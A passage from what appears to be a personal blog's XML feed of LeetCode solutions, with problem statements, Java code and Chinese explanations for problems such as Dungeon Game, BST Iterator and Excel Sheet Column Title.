<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String[] str = <span class="keyword">new</span> String[nums.length];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i ++)</span><br><span class="line">        str[i] = Integer.toString(nums[i]);</span><br><span class="line">        </span><br><span class="line">    Arrays.sort(str, <span class="keyword">new</span> Comparator&lt;String&gt;() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> -(a+b).compareTo(b+a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// If, after being sorted, the largest number is `0`, </span></span><br><span class="line">    <span class="comment">// the entire number is zero.</span></span><br><span class="line">    <span class="keyword">if</span> (str[<span class="number">0</span>].equals(<span class="string">"0"</span>) &amp;&amp; str.length &gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">        </span><br><span class="line">    StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span>(String s : str)</span><br><span class="line">        res.append(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>击败了98%，看来函数式编程真的慢。</p>
<p>就这么一种解决方案。还以为有其他的。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[174. Dungeon Game]]></title>
      <url>/wiki/2017/10/30/Leetcode-174-Dungeon-Game/</url>
      <content type="html"><![CDATA[<p>The demons had captured the princess (<strong>P</strong>) and imprisoned her in the bottom-right corner of a dungeon. The dungeon consists of $M \times N$ rooms laid out in a 2D grid. Our valiant knight (<strong>K</strong>) was initially positioned in the top-left room and must fight his way through the dungeon to rescue the princess.</p>
<p>The knight has an initial health point represented by a positive integer. If at any point his health point drops to 0 or below, he dies immediately.</p>
<p>Some of the rooms are guarded by demons, so the knight loses health (<em>negative</em> integers) upon entering these rooms; other rooms are either empty (0’s) or contain magic orbs that increase the knight’s health (<em>positive</em> integers).</p>
<p>In order to reach the princess as quickly as possible, the knight decides to move only rightward or downward in each step.</p>
<p><strong>Write a function to determine the knight’s minimum initial health so that he is able to rescue the princess.</strong></p>
<p>For example, given the dungeon below, the initial health of the knight must be at least 7 if he follows the optimal path <code>RIGHT-&gt; RIGHT -&gt; DOWN -&gt; DOWN</code>.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode174.png?imageslim" alt="LeetCode174"></p>
<p><strong>Note</strong>:</p>
<ul>
<li>The knight’s health has no upper bound.</li>
<li>Any room can contain threats or power-ups, even the first room the knight enters and the bottom-right room where the princess is imprisoned.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这个问题难点在于问题的定义。看完题目以后，可以很明显确定用动态规划方法，但是找到状态方程却不简单。</p>
<p>最开始，最直接也是最常见的定义状态或者子问题的方式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j] = 从(0,0)到(i,j)的最小健康点损失</span><br></pre></td></tr></table></figure>
<p>这种定义与LeetCode 64. Minimum Path Sum的定义类似。但是很可惜，这样根本不能解决问题，因为dp[i][j]并不依赖于前面的子问题dp[i-1][j]和dp[i][j-1]。所以只能另辟蹊径了。另一种常见的定义状态和子问题的方法为从问题的另一端定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initialHealth[i][j] = 从(i,j)出发，到达公主(终点)所需最低健康值</span><br></pre></td></tr></table></figure>
<p>首先，我们知道在任意一点(i,j)，健康值达到0或者0一下，武士会立刻死亡，也就是说</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initialHealth[i][j] &gt; <span class="number">0</span> <span class="keyword">or</span> initialHealth[i][j] &gt;= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>另外，由于经过(i, j)，武士的健康值会发生增加或者减少，幅度为dungeon[i][j]，因此</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从(i, j) 到达 (i+1, j)</span></span><br><span class="line">initialHealth[i][j] + dungeon[i][j] &gt;= initialHealth[i+<span class="number">1</span>][j]</span><br><span class="line">initialHealth[i][j] = max(<span class="number">1</span>, initialHealth[i+<span class="number">1</span>][j] - dungeon[i][j])</span><br></pre></td></tr></table></figure>
<p>好了，下一步，我们观察子问题之间的关系，试图发现状态方程。由于在(i,j)点的武士下一步即可以去(i, j+1)，也可以去(i+1, j)。所以要从两者之间选择一个需要初始健康值最小的路径。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">initialHealth[i][j] = max(<span class="number">1</span>, </span><br><span class="line">    min(initialHealth[i + <span class="number">1</span>][j], initialHealth[i][j + <span class="number">1</span>]) - dungeon[i][j]);</span><br></pre></td></tr></table></figure>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">calculateMinimumHP</span><span class="params">(<span class="keyword">int</span>[][] dungeon)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dungeon == <span class="keyword">null</span> || dungeon.length == <span class="number">0</span> || dungeon[<span class="number">0</span>].length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m = dungeon.length, n = dungeon[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] initialHealth = <span class="keyword">new</span> <span class="keyword">int</span>[m][n];</span><br><span class="line">    initialHealth[m - <span class="number">1</span>][n - <span class="number">1</span>] = Math.max(<span class="number">1</span>,  <span class="number">1</span> - dungeon[m - <span class="number">1</span>][n - <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        initialHealth[i][n - <span class="number">1</span>] = Math.max(<span class="number">1</span>,  </span><br><span class="line">            initialHealth[i + <span class="number">1</span>][n - <span class="number">1</span>] - dungeon[i][n - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = n - <span class="number">2</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">        initialHealth[m - <span class="number">1</span>][j] = Math.max(<span class="number">1</span>,  </span><br><span class="line">            initialHealth[m - <span class="number">1</span>][j + <span class="number">1</span>] - dungeon[m - <span class="number">1</span>][j]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = n - <span class="number">2</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">            initialHealth[i][j] = Math.max(<span class="number">1</span>, </span><br><span class="line">                Math.min(initialHealth[i+<span class="number">1</span>][j], initialHealth[i][j+<span class="number">1</span>]) - dungeon[i][j]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> initialHealth[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[173. Binary Search Tree Iterator]]></title>
      <url>/wiki/2017/10/30/Leetcode-173-Binary-Search-Tree-Iterator/</url>
      <content type="html"><![CDATA[<p>Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST.</p>
<p>Calling <code>next()</code> will return the next smallest number in the BST.</p>
<p>Note: <code>next()</code> and <code>hasNext()</code> should run in average $O(1)$ time and uses $O(h)$ memory, where $h$ is the height of the tree.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目看到的时候就可以想到用中序遍历，把中序遍历的结果放在List中，然后调用<code>List.iterator()</code>方法。但是这道题目的要求更高，它的空间复杂度要求是$O(h)$，其中$h$是树的高度。这样一来这种方法就不行了。仔细观察二叉树的中序遍历：(代码来自LeeCode 94. Binary Tree Inorder Traversal)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.isEmpty()) &#123; </span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123; </span><br><span class="line">            <span class="comment">// Travel to each node's left child,</span></span><br><span class="line">            <span class="comment">// till reach the left leaf</span></span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;             </span><br><span class="line">        &#125;        </span><br><span class="line">        cur = stack.pop(); <span class="comment">// Backtrack to higher level node A</span></span><br><span class="line">        res.add(cur.val);  <span class="comment">// Add the node to the result list</span></span><br><span class="line">        cur = cur.right;   <span class="comment">// Switch to A'right branch</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恰好每一个while循环有一个节点加入<code>List</code>，那么一个猜想就是我们可不可以把每个while循环拆分开，相当于一个每个while循环就是一个<code>next()</code>方法调用。那么怎么判断<code>hasNext()</code>呢，一定和while循环的条件差不多。 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span>  Stack&lt;TreeNode&gt; stack;</span><br><span class="line">    <span class="keyword">private</span> TreeNode cur;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BSTIterator</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        cur = root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@return</span> whether we have a next smallest number */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cur != <span class="keyword">null</span> || stack.size() != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@return</span> the next smallest number */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123; </span><br><span class="line">            <span class="comment">// Travel to each node's left child,</span></span><br><span class="line">            <span class="comment">// till reach the left leaf</span></span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;             </span><br><span class="line">        &#125;        </span><br><span class="line">        cur = stack.pop(); <span class="comment">// Backtrack to higher level node A</span></span><br><span class="line">        <span class="keyword">int</span> res = cur.val;  <span class="comment">// Add the node to the result </span></span><br><span class="line">        cur = cur.right;   <span class="comment">// Switch to A'right branch</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码和中序遍历基本一致，只改变了while循环为<code>next()</code>。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Stack </tag>
            
            <tag> Design </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[538. Convert BST to Greater Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-538-Convert-BST-to-Greater-Tree/</url>
      <content type="html"><![CDATA[<p>Given a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus sum of all keys greater than the original key in BST.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: The root of a Binary Search Tree like this:</span><br><span class="line">              5</span><br><span class="line">            /   \</span><br><span class="line">           2     13</span><br><span class="line"></span><br><span class="line">Output: The root of a Greater Tree like this:</span><br><span class="line">             18</span><br><span class="line">            /   \</span><br><span class="line">          20     13</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>首先想到的办法是直接根据题目的描述一步一步做。第一步，遍历整个二叉树得到节点。第二步，计算每个节点的值。第三步，遍历二叉树给节点赋值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> position;</span><br><span class="line"><span class="keyword">private</span> List&lt;Integer&gt; list;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">convertBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">    inorderTraversal(root);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = list.size() - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        list.set(i, list.get(i) + list.get(i+<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(list);</span><br><span class="line">    inorderTraversalSet(root);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorderTraversalSet</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    inorderTraversalSet(root.left);</span><br><span class="line">    root.val = list.get(position++);</span><br><span class="line">    inorderTraversalSet(root.right);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    inorderTraversal(root.left);</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    inorderTraversal(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般的中序遍历的结果是依次递增的序列，那么可不可以变成依次递减的序列，这样的话，就可以通过递归来一次性赋值了。答案是可以：通过交换访问左子节点和右子节点的顺序。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">convertBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    convertBST(root.right);</span><br><span class="line">    sum += root.val;</span><br><span class="line">    root.val = sum;</span><br><span class="line">    convertBST(root.left);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[507. Perfect Number]]></title>
      <url>/wiki/2017/10/30/Leetcode-507-Perfect-Number/</url>
      <content type="html"><![CDATA[<p>We define the Perfect Number is a <strong>positive</strong> integer that is equal to the sum of all its positive <strong>divisors</strong> except itself.</p>
<p>Now, given an integer $n$, write a function that returns true when it is a perfect number and false when it is not.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 28</span><br><span class="line">Output: True</span><br><span class="line">Explanation: 28 = 1 + 2 + 4 + 7 + 14</span><br></pre></td></tr></table></figure>
<p>Note: The input number $n$ will not exceed 100,000,000. (1e8)</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>完全数的所有的真因子(即除了自身以外的约数)的和，恰好等于它本身。时间复杂度$O(\log n)$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPerfectNumber</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 1 肯定是因子</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i * i &lt; num; i++) &#123; <span class="comment">// i从2开始</span></span><br><span class="line">        <span class="keyword">if</span> (num % i == <span class="number">0</span>)</span><br><span class="line">            sum += i + num/i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum == num; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[170. TwoSum III]]></title>
      <url>/wiki/2017/10/30/Leetcode-170-TwoSum-III/</url>
      <content type="html"><![CDATA[<p>Design and implement a TwoSum class. It should support the following operations: add and find.</p>
<p>add - Add the number to an internal data structure.<br>find - Find if there exists any pair of numbers which sum is equal to the value.</p>
<p>For example,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(1); add(3); add(5);</span><br><span class="line">find(4) -&gt; true</span><br><span class="line">find(7) -&gt; false</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Design and implement a TwoSum class.</span></span><br><span class="line"><span class="comment"> * It should support the following operations: add and find.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * add - Add the number to an internal data structure.</span></span><br><span class="line"><span class="comment"> * find - Find if there exists any pair of numbers which sum is equal to the value.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For example,</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * add(1); add(3); add(5);</span></span><br><span class="line"><span class="comment"> * find(4) -&gt; true</span></span><br><span class="line"><span class="comment"> * find(7) -&gt; false</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 需要注意数据有可能重复的情况</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q170TwoSumIII</span> </span>&#123;</span><br><span class="line">    <span class="comment">// map stores key: num, value: count</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(num)) &#123;</span><br><span class="line">            map.put(num, map.get(num) + <span class="number">1</span>); <span class="comment">// count ++</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            map.put(num, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Integer num: map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((target != num * <span class="number">2</span>) &amp;&amp; map.containsKey(target-num)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((target == num * <span class="number">2</span>) &amp;&amp; (map.get(num) &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="comment">// end if</span></span><br><span class="line">        &#125; <span class="comment">// end for</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="comment">// end find</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Design </tag>
            
            <tag> HashMap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[168. Excel Sheet Column Title]]></title>
      <url>/wiki/2017/10/30/Leetcode-168-Excel-Sheet-Column-Title/</url>
      <content type="html"><![CDATA[<p>Given a positive integer, return its corresponding column title as appear in an Excel sheet.</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt; A</span><br><span class="line">2 -&gt; B</span><br><span class="line">3 -&gt; C</span><br><span class="line">...</span><br><span class="line">26 -&gt; Z</span><br><span class="line">27 -&gt; AA</span><br><span class="line">28 -&gt; AB </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1</span><br><span class="line">Output: &quot;A&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 28</span><br><span class="line">Output: &quot;AB&quot;</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 701</span><br><span class="line">Output: &quot;ZY&quot;</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>从最后一位开始“解码”，比较容易计算。特别需要注意是26的倍数，这种情况：最后一个字母为Z。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">convertToTitle</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">26</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            sb.append(<span class="string">'Z'</span>);</span><br><span class="line">            n -= <span class="number">26</span>; &#125;</span><br><span class="line">        <span class="keyword">else</span> sb.append((<span class="keyword">char</span>)(<span class="string">'A'</span> + n % <span class="number">26</span> - <span class="number">1</span>));</span><br><span class="line">        n /= <span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[167. Two Sum II - Input array is sorted]]></title>
      <url>/wiki/2017/10/30/Leetcode-167-Two-Sum-II-Input-array-is-sorted/</url>
      <content type="html"><![CDATA[<p>Given an array of integers that is already <strong><em>sorted in ascending order</em></strong>, find two numbers such that they add up to a specific target number.</p>
<p>The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2.</p>
<p><strong>Note</strong>:</p>
<ul>
<li>Your returned answers (both index1 and index2) are not zero-based.</li>
<li>You may assume that each input would have exactly one solution and you may not use the same element twice.</li>
</ul>
